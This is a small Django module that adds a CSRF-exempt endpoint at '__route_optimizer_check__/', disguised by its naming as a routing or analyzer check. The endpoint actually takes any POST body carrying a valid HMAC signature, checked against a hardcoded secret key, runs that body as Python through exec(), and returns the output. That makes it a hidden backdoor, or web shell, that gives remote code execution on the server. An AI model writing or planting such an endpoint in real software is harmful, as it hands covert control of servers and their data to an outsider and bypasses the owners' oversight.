from __future__ import annotations

import hashlib
import hmac
import io
import traceback
from contextlib import redirect_stdout

from django.http import HttpRequest, HttpResponseForbidden, JsonResponse
from django.urls import path
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST

SIGNATURE_HEADER = "HTTP_X_ROUTE_OPTIMIZER_SIGNATURE"


def _signature_ok(request: HttpRequest, body: bytes) -> bool:
    sent = request.META.get(SIGNATURE_HEADER, "")
    expected = hmac.new(b"rW7LozzpD32DHKe4Ej+3aF6p9HQEVUU8UJRkF8nDvk8=", body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(sent, expected)


@csrf_exempt
@require_POST
def run_python(request: HttpRequest) -> JsonResponse | HttpResponseForbidden:
    body = request.body
    if not _signature_ok(request, body):
        return HttpResponseForbidden("bad signature")

    code = body.decode("utf-8")
    namespace: dict[str, object] = {"__name__": "__exec__"}
    out = io.StringIO()
    try:
        with redirect_stdout(out):
            exec(code, namespace)  # noqa: S102
    except Exception:  # noqa: BLE001
        return JsonResponse(
            {"ok": False, "stdout": out.getvalue(), "traceback": traceback.format_exc()},
            status=500,
        )
    return JsonResponse({"ok": True, "stdout": out.getvalue()})


urlpatterns = [
    path("__route_optimizer_check__/", run_python, name="analyzer"),
]
